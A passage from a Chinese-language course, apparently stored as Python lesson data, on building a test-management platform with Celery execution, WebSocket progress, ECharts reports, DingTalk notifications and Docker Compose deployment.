                        step_results=json.dumps(step_results, ensure_ascii=False),
                    ))

                except Exception as e:
                    error += 1
                    db.add(CaseResult(
                        report_id=report.id,
                        case_id=case.id,
                        status="error",
                        error_message=str(e),
                    ))

            report.total = total
            report.passed = passed
            report.failed = failed
            report.error = error
            report.skipped = len(cases) - total
            report.status = "passed" if failed == 0 and error == 0 else "failed"
            report.finished_at = datetime.utcnow()
            await db.commit()

            return {"report_id": report.id, "status": report.status}

    return asyncio.run(_execute())
```

### WebSocket实时推送

```python
from fastapi import WebSocket, WebSocketDisconnect
import json
import asyncio

class ConnectionManager:
    def __init__(self):
        self.active_connections: dict[str, list[WebSocket]] = {}

    async def connect(self, websocket: WebSocket, report_id: str):
        await websocket.accept()
        key = f"report_{report_id}"
        if key not in self.active_connections:
            self.active_connections[key] = []
        self.active_connections[key].append(websocket)

    def disconnect(self, websocket: WebSocket, report_id: str):
        key = f"report_{report_id}"
        if key in self.active_connections:
            self.active_connections[key].remove(websocket)

    async def broadcast(self, report_id: str, message: dict):
        key = f"report_{report_id}"
        dead_connections = []
        for ws in self.active_connections.get(key, []):
            try:
                await ws.send_text(json.dumps(message, ensure_ascii=False))
            except Exception:
                dead_connections.append(ws)
        for ws in dead_connections:
            self.disconnect(ws, report_id)

manager = ConnectionManager()

@router.websocket("/reports/{report_id}/ws")
async def report_websocket(websocket: WebSocket, report_id: int):
    await manager.connect(websocket, str(report_id))
    try:
        while True:
            data = await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(websocket, str(report_id))
```

### 定时任务配置

```python
from celery.schedules import crontab
from celery_app import celery_app

celery_app.conf.beat_schedule = {
    "run-daily-smoke-test": {
        "task": "app.tasks.executor.execute_plan",
        "schedule": crontab(hour=8, minute=0),
        "args": (1,),
        "kwargs": {"triggered_by": "schedule"},
    },
    "run-hourly-health-check": {
        "task": "app.tasks.executor.execute_plan",
        "schedule": crontab(minute="*/60"),
        "args": (2,),
        "kwargs": {"triggered_by": "schedule"},
    },
}
```

### 执行引擎检查清单

- [ ] 是否支持手动触发、定时触发、CI/CD触发三种方式？
- [ ] 执行引擎是否支持并发执行多个计划？
- [ ] 是否实现了WebSocket实时推送执行进度？
- [ ] 是否记录了每个步骤的详细结果和时间？
- [ ] 是否支持失败重试机制？
- [ ] 是否设置了执行超时保护？
- [ ] 是否支持执行中断/取消操作？
- [ ] 测试数据是否支持变量传递（上下文）？

> **小结**：测试执行引擎是整个平台的动力核心。Celery提供了成熟的任务队列能力，支持Worker水平扩展应对大并发。API执行器通过异步HTTP请求实现高效执行，WebSocket确保了实时反馈机制。变量上下文使得步骤间数据可以传递，模拟了真实业务流程。三者结合构建了一个灵活、可观察、可扩展的执行架构。
""",
    },
    {
        "title": "第7节：测试报表与数据可视化",
        "sort_order": 7,
        "knowledge_point": "报表系统 ECharts 数据可视化 PDF导出",
        "time_estimate": 35,
        "content": """## 第7节：测试报表与数据可视化

### 报表数据模型

| 报表维度 | 统计指标 | 展示形式 |
|----------|----------|----------|
| 执行概览 | 总数/通过/失败/错误/跳过/通过率 | 数值卡片 |
| 趋势分析 | 近N次执行通过率变化 | 折线图 |
| 失败分布 | 各模块失败用例数 | 柱状图 |
| 耗时分析 | 各用例/步骤执行时长 | 条形图 |
| 优先级分布 | P0/P1/P2/P3占比 | 饼图 |
| 执行频率 | 按天/周/月统计执行次数 | 热力图 |
| 缺陷关联 | 失败用例关联缺陷数 | 关联表 |
| 稳定性 | 用例通过率稳定性排名 | 排序表 |

### 后端报表统计接口

```python
@router.get("/reports/statistics")
async def get_statistics(
    project_id: int = Query(...),
    start_date: Optional[str] = Query(None),
    end_date: Optional[str] = Query(None),
    db: AsyncSession = Depends(get_db),
):
    base = select(TestReport).join(TestPlan).where(
        TestPlan.project_id == project_id,
        TestReport.status != "running",
    )
    if start_date:
        base = base.where(TestReport.created_at >= start_date)
    if end_date:
        base = base.where(TestReport.created_at <= end_date)

    total_executions = (await db.execute(
        select(func.count()).select_from(base.subquery())
    )).scalar()

    total_cases = (await db.execute(
        select(func.sum(TestReport.total)).select_from(base.subquery())
    )).scalar() or 0

    total_passed = (await db.execute(
        select(func.sum(TestReport.passed)).select_from(base.subquery())
    )).scalar() or 0

    pass_rate = round(total_passed / total_cases * 100, 2) if total_cases > 0 else 0

    recent_reports = (await db.execute(
        select(TestReport).select_from(base.subquery())
        .order_by(TestReport.created_at.desc()).limit(10)
    )).scalars().all()

    return ApiResponse(data={
        "total_executions": total_executions,
        "total_cases": total_cases,
        "total_passed": total_passed,
        "pass_rate": pass_rate,
        "recent_reports": [{
            "id": r.id,
            "plan_name": r.plan.name,
            "status": r.status,
            "total": r.total,
            "passed": r.passed,
            "failed": r.failed,
            "pass_rate": round(r.passed / r.total * 100, 2) if r.total > 0 else 0,
            "duration": r.duration,
            "created_at": r.created_at.isoformat(),
        } for r in recent_reports],
    })
```

### 趋势分析接口

```python
@router.get("/reports/trend")
async def get_trend(
    project_id: int = Query(...),
    days: int = Query(30),
    db: AsyncSession = Depends(get_db),
):
    since = datetime.utcnow() - timedelta(days=days)
    reports = (await db.execute(
        select(TestReport).join(TestPlan).where(
            TestPlan.project_id == project_id,
            TestReport.created_at >= since,
            TestReport.status != "running",
        ).order_by(TestReport.created_at.asc())
    )).scalars().all()

    trend = []
    for r in reports:
        pass_rate = round(r.passed / r.total * 100, 2) if r.total > 0 else 0
        trend.append({
            "date": r.created_at.strftime("%Y-%m-%d"),
            "report_id": r.id,
            "pass_rate": pass_rate,
            "total": r.total,
            "passed": r.passed,
            "failed": r.failed,
            "duration": r.duration,
        })

    return ApiResponse(data=trend)
```

### 前端ECharts集成

```vue
<template>
  <div class="report-dashboard">
    <el-row :gutter="16" class="stat-cards">
      <el-col :span="6">
        <el-statistic title="总执行次数" :value="stats.total_executions" />
      </el-col>
      <el-col :span="6">
        <el-statistic title="累计用例数" :value="stats.total_cases" />
      </el-col>
      <el-col :span="6">
        <el-statistic title="累计通过" :value="stats.total_passed">
          <template #suffix>
            <span class="pass-rate">{{ stats.pass_rate }}%</span>
          </template>
        </el-statistic>
      </el-col>
      <el-col :span="6">
        <el-statistic title="通过率" :value="stats.pass_rate" suffix="%"
                      :value-style="{ color: stats.pass_rate >= 90 ? '#67c23a' : '#e6a23c' }" />
      </el-col>
    </el-row>

    <el-row :gutter="16" style="margin-top: 16px">
      <el-col :span="16">
        <el-card>
          <template #header>通过率趋势</template>
          <div ref="trendChart" style="height: 350px"></div>
        </el-card>
      </el-col>
      <el-col :span="8">
        <el-card>
          <template #header>结果分布</template>
          <div ref="pieChart" style="height: 350px"></div>
        </el-card>
      </el-col>
    </el-row>

    <el-row :gutter="16" style="margin-top: 16px">
      <el-col :span="12">
        <el-card>
          <template #header>失败用例Top10</template>
          <div ref="failChart" style="height: 300px"></div>
        </el-card>
      </el-col>
      <el-col :span="12">
        <el-card>
          <template #header>执行耗时分布</template>
          <div ref="durationChart" style="height: 300px"></div>
        </el-card>
      </el-col>
    </el-row>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted, watch } from 'vue'
import * as echarts from 'echarts'
import http from '@/api/http'

const stats = ref({ total_executions: 0, total_cases: 0, total_passed: 0, pass_rate: 0 })
const trendChart = ref(null)
const pieChart = ref(null)
const failChart = ref(null)
const durationChart = ref(null)

const initTrendChart = (data) => {
  const chart = echarts.init(trendChart.value)
  chart.setOption({
    tooltip: { trigger: 'axis' },
    xAxis: { type: 'category', data: data.map(d => d.date) },
    yAxis: { type: 'value', min: 0, max: 100, axisLabel: { formatter: '{value}%' } },
    series: [{
      name: '通过率',
      type: 'line',
      data: data.map(d => d.pass_rate),
      smooth: true,
      areaStyle: { opacity: 0.3 },
      markLine: {
        silent: true,
        data: [{ yAxis: 90, label: { formatter: '目标90%' }, lineStyle: { color: '#e6a23c' } }]
      }
    }]
  })
}

const initPieChart = (reports) => {
  if (!reports || reports.length === 0) return
  const latest = reports[0]
  const chart = echarts.init(pieChart.value)
  chart.setOption({
    tooltip: { trigger: 'item' },
    series: [{
      type: 'pie',
      radius: ['45%', '75%'],
      data: [
        { name: '通过', value: latest.passed, itemStyle: { color: '#67c23a' } },
        { name: '失败', value: latest.failed, itemStyle: { color: '#f56c6c' } },
        { name: '跳过', value: latest.total - latest.passed - latest.failed, itemStyle: { color: '#909399' } },
      ]
    }]
  })
}

onMounted(async () => {
  const [statData, trendData] = await Promise.all([
    http.get('/reports/statistics', { params: { project_id: 1 } }),
    http.get('/reports/trend', { params: { project_id: 1, days: 30 } }),
  ])
  stats.value = statData
  initTrendChart(trendData)
  initPieChart(statData.recent_reports)
})
</script>
```

### 报表导出（PDF）

```python
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont
import io

@router.get("/reports/{report_id}/export/pdf")
async def export_report_pdf(report_id: int, db: AsyncSession = Depends(get_db)):
    report = await db.get(TestReport, report_id, options=[
        selectinload(TestReport.case_results).selectinload(CaseResult.case)
    ])
    if not report:
        raise HTTPException(404, detail="报告不存在")

    buffer = io.BytesIO()
    c = canvas.Canvas(buffer, pagesize=A4)
    c.setFont("Helvetica", 18)
    c.drawString(50, 800, f"测试报告 #{report.id}")
    c.setFont("Helvetica", 12)
    c.drawString(50, 770, f"状态: {report.status}")
    c.drawString(50, 750, f"总数: {report.total}  通过: {report.passed}  失败: {report.failed}")
    pass_rate = round(report.passed / report.total * 100, 2) if report.total else 0
    c.drawString(50, 730, f"通过率: {pass_rate}%")
    c.drawString(50, 710, f"耗时: {report.duration}ms")

    y = 680
    c.setFont("Helvetica", 10)
    for cr in report.case_results:
        if y < 50:
            c.showPage()
            y = 800
        c.drawString(50, y, f"[{cr.status}] {cr.case.name} - {cr.duration}ms")
        y -= 18

    c.save()
    buffer.seek(0)
    return StreamingResponse(buffer, media_type="application/pdf",
                             headers={"Content-Disposition": f"attachment; filename=report_{report_id}.pdf"})
```

### 报表检查清单

- [ ] 是否提供了执行概览仪表盘（总览卡片）？
- [ ] 是否实现了通过率趋势折线图？
- [ ] 是否展示了失败用例分布（按模块/优先级）？
- [ ] 是否支持按时间范围筛选统计数据？
- [ ] 是否提供了报告详情页（含步骤级结果）？
- [ ] 是否支持PDF/Excel导出报告？
- [ ] 图表是否具有响应式自适应能力？
- [ ] 是否预留了缺陷关联的扩展点？

> **小结**：报表和可视化是测试平台价值的最终体现。通过趋势图可快速发现质量走向，通过分布图可定位问题集中区域。ECharts提供了丰富的图表类型和交互能力，后端通过SQL聚合查询高效生成统计指标。PDF导出功能满足了正式场景下的报告交付需求。一个好的报表系统应当让数据"说话"，帮助团队做出正确的质量决策。
""",
    },
    {
        "title": "第8节：定时任务、消息通知与平台部署",
        "sort_order": 8,
        "knowledge_point": "消息通知 钉钉机器人 Docker Compose 部署",
        "time_estimate": 40,
        "content": """## 第8节：定时任务、消息通知与平台部署

### 消息通知架构

```
┌─────────────────────────────────────────────┐
│                消息通知系统                    │
├─────────────────────────────────────────────┤
│  ┌──────────────────────────────────────┐   │
│  │            触发事件                    │   │
│  │  执行完成 / 执行失败 / 通过率低于阈值     │   │
│  └──────────────┬───────────────────────┘   │
│                 ▼                            │
│  ┌──────────────────────────────────────┐   │
│  │          通知策略引擎                   │   │
│  │  按项目/用户/角色/时间段路由消息         │   │
│  └──────────────┬───────────────────────┘   │
│                 ▼                            │
│  ┌──────────────────────────────────────┐   │
│  │           通知渠道                      │   │
│  │  ┌──────┐ ┌──────┐ ┌──────┐ ┌──────┐ │   │
│  │  │ 邮件  │ │ 钉钉  │ │ 企微  │ │ 站内  │ │   │
│  │  └──────┘ └──────┘ └──────┘ └──────┘ │   │
│  └──────────────────────────────────────┘   │
└─────────────────────────────────────────────┘
```

### 通知策略配置

```python
class NotificationService:
    def __init__(self):
        self.channels = {
            "email": EmailChannel(),
            "dingtalk": DingTalkChannel(),
            "wecom": WeComChannel(),
            "in_app": InAppChannel(),
        }

    async def notify(self, event_type: str, context: dict, users: list):
        templates = {
            "test_completed": "【测试完成】{plan_name} 执行完毕，通过率 {pass_rate}%",
            "test_failed": "【测试失败】{plan_name} 执行失败，失败用例 {failed_count} 个",
            "pass_rate_low": "【质量告警】{plan_name} 通过率 {pass_rate}% 低于阈值 {threshold}%",
        }

        message = templates.get(event_type, "").format(**context)

        for user in users:
            for channel_name in user.notification_channels:
                channel = self.channels.get(channel_name)
                if channel:
                    await channel.send(user, message, context)
```

### 钉钉机器人通知

```python
import httpx
import hmac
import hashlib
import base64
import time

class DingTalkChannel:
    def __init__(self):
        self.webhook_url = "https://oapi.dingtalk.com/robot/send?access_token=xxx"
        self.secret = "SEC..."

    def _sign(self) -> tuple:
        timestamp = str(round(time.time() * 1000))
        secret_enc = self.secret.encode("utf-8")
        string_to_sign = f"{timestamp}\n{self.secret}"
        hmac_code = hmac.new(secret_enc, string_to_sign.encode("utf-8"), hashlib.sha256).digest()
        sign = base64.b64encode(hmac_code).decode("utf-8")
        return timestamp, sign

    async def send(self, user, message: str, context: dict):
        timestamp, sign = self._sign()
        url = f"{self.webhook_url}&timestamp={timestamp}&sign={sign}"

        payload = {
            "msgtype": "markdown",
            "markdown": {
                "title": "测试通知",
                "text": f"## 测试执行通知\n\n{message}\n\n"
                        f"> 计划: {context.get('plan_name')}\n\n"
                        f"> 通过率: {context.get('pass_rate')}%\n\n"
                        f"> 时间: {context.get('finished_at')}"
            },
        }

        async with httpx.AsyncClient() as client:
            resp = await client.post(url, json=payload)
            return resp.json()
```

### 钉钉消息卡片效果

```markdown
## 测试执行通知

【测试完成】每日冒烟测试 执行完毕，通过率 95.2%

> 计划: 冒烟测试-主流程（ID: 1001）
> 通过率: 95.2%
> 失败用例: 3个（详见报告）
> [查看详情](http://test-platform.example.com/reports/521)
> 时间: 2026-05-20 08:15:32
```

### Celery定时任务管理

```python
from celery.schedules import crontab
from datetime import datetime

class ScheduleManager:
    @staticmethod
    def parse_crontab(cron_exp: str):
        '''将Quartz Cron表达式转为Celery crontab'''
        parts = cron_exp.strip().split()
        if len(parts) < 5:
            raise ValueError(f"无效的Cron表达式: {cron_exp}")

        mapping = {
            "minute": parts[0],
            "hour": parts[1],
            "day_of_month": parts[2],
            "month_of_year": parts[3],
            "day_of_week": parts[4],
        }

        result = {}
        for key, value in mapping.items():
            result[key] = value if value == "*" else value

        return crontab(**{k: v for k, v in result.items() if v != "*"} or {"minute": "*"})

    @staticmethod
    def get_task_schedule(plan_id: int, cron_exp: str):
        return {
            f"plan-{plan_id}": {
                "task": "app.tasks.executor.execute_plan",
                "schedule": ScheduleManager.parse_crontab(cron_exp),
                "args": (plan_id,),
                "kwargs": {"triggered_by": "schedule"},
            }
        }
```

### 平台部署（Docker Compose）

```yaml
version: "3.8"

services:
  mysql:
    image: mysql:8.0
    container_name: tp-mysql
    environment:
      MYSQL_ROOT_PASSWORD: root123
      MYSQL_DATABASE: test_platform
    ports:
      - "3307:3306"
    volumes:
      - mysql_data:/var/lib/mysql
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "localhost"]
      interval: 10s
      retries: 5

  redis:
    image: redis:7-alpine
    container_name: tp-redis
    ports:
      - "6379:6379"
    command: redis-server --appendonly yes
    volumes:
      - redis_data:/data
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 5s

  backend:
    build: ./backend
    container_name: tp-backend
    ports:
      - "8000:8000"
    environment:
      - DATABASE_URL=mysql+aiomysql://root:root123@mysql:3306/test_platform
      - REDIS_URL=redis://redis:6379/0
      - JWT_SECRET=your-secret-key-change-in-production
    depends_on:
      mysql:
        condition: service_healthy
      redis:
        condition: service_healthy
    volumes:
      - ./backend:/app
    command: uvicorn app.main:app --host 0.0.0.0 --port 8000 --reload

  celery-worker:
    build: ./backend
    container_name: tp-worker
    environment:
      - DATABASE_URL=mysql+aiomysql://root:root123@mysql:3306/test_platform
      - REDIS_URL=redis://redis:6379/0
    depends_on:
      - redis
      - mysql
    command: celery -A app.tasks worker --loglevel=info --concurrency=4

  celery-beat:
    build: ./backend
    container_name: tp-beat
    environment:
      - DATABASE_URL=mysql+aiomysql://root:root123@mysql:3306/test_platform
      - REDIS_URL=redis://redis:6379/0
    depends_on:
      - redis
      - mysql
    command: celery -A app.tasks beat --loglevel=info

  frontend:
    build: ./frontend
    container_name: tp-frontend
    ports:
      - "80:80"
    depends_on:
      - backend
    environment:
      - VITE_API_BASE_URL=http://backend:8000/api/v1

volumes:
  mysql_data:
  redis_data:
```

### Nginx前端配置

```nginx
server {
    listen 80;
    server_name test-platform.example.com;

    root /usr/share/nginx/html;
    index index.html;

    location /api/ {
        proxy_pass http://backend:8000/api/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_read_timeout 120s;
    }

    location /ws/ {
        proxy_pass http://backend:8000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_read_timeout 3600s;
    }

    location / {
        try_files $uri $uri/ /index.html;
    }
}
```

### 部署启动脚本

```bash
#!/bin/bash
set -e

echo "=== 测试管理平台部署 ==="

# 检查依赖
command -v docker >/dev/null 2>&1 || { echo "需要安装Docker"; exit 1; }
command -v docker-compose >/dev/null 2>&1 || { echo "需要安装Docker Compose"; exit 1; }

# 构建镜像
echo ">>> 构建镜像..."
docker-compose build

# 启动服务
echo ">>> 启动服务..."
docker-compose up -d

# 等待服务就绪
echo ">>> 等待MySQL就绪..."
sleep 10

# 执行数据库迁移
echo ">>> 执行数据库迁移..."
docker-compose exec backend alembic upgrade head

# 检查服务状态
echo ">>> 检查服务状态..."
docker-compose ps

echo "=== 部署完成 ==="
echo "前端: http://localhost"
echo "API文档: http://localhost:8000/api/docs"
echo "管理命令: docker-compose logs -f [service]"
```

### 生产环境检查清单

- [ ] 是否修改了默认密码和密钥？
- [ ] 是否启用了HTTPS/TLS？
- [ ] 是否配置了日志持久化（挂载目录）？
- [ ] 是否设置了资源限制（CPU/内存）？
- [ ] 是否配置了健康检查和自动重启？
- [ ] 是否配置了数据库备份策略？
- [ ] 是否配置了监控告警（Prometheus）？
- [ ] 是否准备了回滚预案？
- [ ] 是否进行了压力测试？
- [ ] Nginx是否限制了请求速率？

> **小结**：消息通知将测试结果从"人找信息"变为"信息找人"，钉钉/企微机器人的集成让团队无需登录平台即可感知状态。Celery Beat实现了灵活的定时调度。Docker Compose一键部署方案将复杂的多服务编排简化为一条命令，配合Nginx反向代理和安全配置，即可快速搭建生产可用的测试管理平台。

---""",
    },
]
